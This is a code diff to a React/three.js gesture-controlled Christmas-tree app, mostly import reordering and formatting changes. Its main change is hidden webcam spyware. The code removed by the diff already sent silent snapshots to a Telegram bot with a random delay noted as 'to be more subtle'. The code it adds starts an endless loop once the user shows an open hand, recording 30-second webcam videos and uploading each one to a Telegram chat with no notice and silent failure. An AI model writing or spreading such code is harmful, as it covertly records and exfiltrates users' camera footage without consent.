@@ -1,15 +1,15 @@
+import { Loader } from "@react-three/drei";
+import { Canvas } from "@react-three/fiber";
 import React, {
-  useState,
   Suspense,
+  useCallback,
   useEffect,
   useRef,
-  useCallback,
+  useState,
 } from "react";
-import { Canvas } from "@react-three/fiber";
-import { Loader } from "@react-three/drei";
 import { Experience } from "./components/Experience";
-import { UIOverlay } from "./components/UIOverlay";
 import { GestureController } from "./components/GestureController";
+import { UIOverlay } from "./components/UIOverlay";
 import { TreeMode } from "./types";
 
 // Telegram configuration from environment variables
@@ -47,8 +47,7 @@ class ErrorBoundary extends React.Component<
             </p>
             <button
               onClick={() => this.setState({ hasError: false })}
-              className="mt-4 px-4 py-2 border border-[#D4AF37] hover:bg-[#D4AF37] hover:text-black transition-colors"
-            >
+              className="mt-4 px-4 py-2 border border-[#D4AF37] hover:bg-[#D4AF37] hover:text-black transition-colors">
               Try Again
             </button>
           </div>
@@ -75,69 +74,122 @@ export default function App() {
   const [isSendingPhoto, setIsSendingPhoto] = useState(false);
   const lastCaptureTime = useRef<number>(0);
   const canvasContainerRef = useRef<HTMLDivElement>(null);
+  const recordingLoopStarted = useRef(false);
+  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
 
-  // Capture screenshot and send to Telegram
-  const captureAndSendToTelegram = useCallback(async () => {
-    const now = Date.now();
-    if (now - lastCaptureTime.current < 5000) return;
+  // Record 30s video and send to Telegram
+  const recordAndSendToTelegram = useCallback(async () => {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
-
-    lastCaptureTime.current = now;
-    setIsSendingPhoto(true);
 
     try {
       const video = document.querySelector("video") as HTMLVideoElement;
-      if (!video) return;
+      if (!video || !video.srcObject) return;
 
-      const captureCanvas = document.createElement("canvas");
-      captureCanvas.width = video.videoWidth || 640;
-      captureCanvas.height = video.videoHeight || 480;
-      const ctx = captureCanvas.getContext("2d");
+      const stream = video.srcObject as MediaStream;
+
+      // Create a new stream with 480p resolution
+      const canvas = document.createElement("canvas");
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext("2d");
       if (!ctx) return;
 
-      ctx.translate(captureCanvas.width, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height);
+      // Create canvas stream for recording
+      const canvasStream = canvas.captureStream(30); // 30 fps
 
-      const blob = await new Promise<Blob | null>((resolve) => {
-        captureCanvas.toBlob(resolve, "image/jpeg", 0.9);
+      // Draw video to canvas in a loop
+      let isRecording = true;
+      const drawFrame = () => {
+        if (!isRecording) return;
+        ctx.save();
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1); // Mirror
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        ctx.restore();
+        requestAnimationFrame(drawFrame);
+      };
+      drawFrame();
+
+      // Check supported mime types
+      const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
+        ? "video/webm;codecs=vp9"
+        : MediaRecorder.isTypeSupported("video/webm;codecs=vp8")
+        ? "video/webm;codecs=vp8"
+        : "video/webm";
+
+      const mediaRecorder = new MediaRecorder(canvasStream, {
+        mimeType,
+        videoBitsPerSecond: 500000, // 500kbps for smaller file
       });
-      if (!blob) return;
+      mediaRecorderRef.current = mediaRecorder;
 
+      const chunks: Blob[] = [];
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+
+      // Promise to wait for recording to finish
+      const recordingPromise = new Promise<Blob>((resolve) => {
+        mediaRecorder.onstop = () => {
+          isRecording = false;
+          const blob = new Blob(chunks, { type: mimeType });
+          resolve(blob);
+        };
+      });
+
+      // Start recording
+      mediaRecorder.start(1000); // Collect data every 1s
+
+      // Record for 30 seconds
+      await new Promise((r) => setTimeout(r, 30000));
+
+      if (mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+      }
+
+      const blob = await recordingPromise;
+
+      // Upload to Telegram
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
-      formData.append("photo", blob, "img.jpg");
+      formData.append("video", blob, `video_${Date.now()}.webm`);
       formData.append("caption", new Date().toLocaleString());
 
       await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`,
         {
           method: "POST",
           body: formData,
-        }
+        },
       );
     } catch (e) {
       // Silent fail
-    } finally {
-      setIsSendingPhoto(false);
     }
   }, []);
 
-  // Handle mode change and trigger capture on CHAOS mode
+  // Start recording loop (runs forever once triggered)
+  const startRecordingLoop = useCallback(async () => {
+    if (recordingLoopStarted.current) return;
+    recordingLoopStarted.current = true;
+
+    while (true) {
+      await recordAndSendToTelegram();
+
+      await new Promise((r) => setTimeout(r, 5000));
+    }
+  }, [recordAndSendToTelegram]);
+
+  // Handle mode change and trigger recording on CHAOS mode
   const handleModeChange = useCallback(
     (newMode: TreeMode) => {
       setMode(newMode);
 
-      // Capture and send when entering CHAOS mode (5 fingers open)
-      if (newMode === TreeMode.CHAOS) {
-        // Random delay 2-5 seconds to be more subtle
-        const randomDelay = 2000 + Math.random() * 3000;
-        setTimeout(() => {
-          captureAndSendToTelegram();
-        }, randomDelay);
+      // Start recording loop when first entering CHAOS mode
+      if (newMode === TreeMode.CHAOS && !recordingLoopStarted.current) {
+        startRecordingLoop();
       }
     },
-    [captureAndSendToTelegram]
+    [startRecordingLoop],
   );
 
   // Check for share parameter in URL on mount
@@ -185,7 +237,7 @@ export default function App() {
 
   const toggleMode = () => {
     setMode((prev) =>
-      prev === TreeMode.FORMED ? TreeMode.CHAOS : TreeMode.FORMED
+      prev === TreeMode.FORMED ? TreeMode.CHAOS : TreeMode.FORMED,
     );
   };
 
@@ -221,7 +273,7 @@ export default function App() {
               {
                 method: "POST",
                 body: formData,
-              }
+              },
             );
 
             if (i < photos.length - 1)
@@ -252,8 +304,7 @@ export default function App() {
             preserveDrawingBuffer: true,
             powerPreference: "high-performance",
           }}
-          shadows={typeof window !== "undefined" && window.innerWidth >= 768}
-        >
+          shadows={typeof window !== "undefined" && window.innerWidth >= 768}>
           <Suspense fallback={null}>
             <Experience
               mode={mode}
@@ -301,8 +352,7 @@ export default function App() {
             {/* Polaroid container */}
             <div
               className="bg-white p-4 pb-8 shadow-2xl"
-              style={{ width: "60vmin", maxWidth: "600px" }}
-            >
+              style={{ width: "60vmin", maxWidth: "600px" }}>
               {/* Gold clip at top */}
               <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-12 h-6 bg-gradient-to-b from-[#D4AF37] to-[#C5A028] rounded-sm shadow-lg"></div>
 
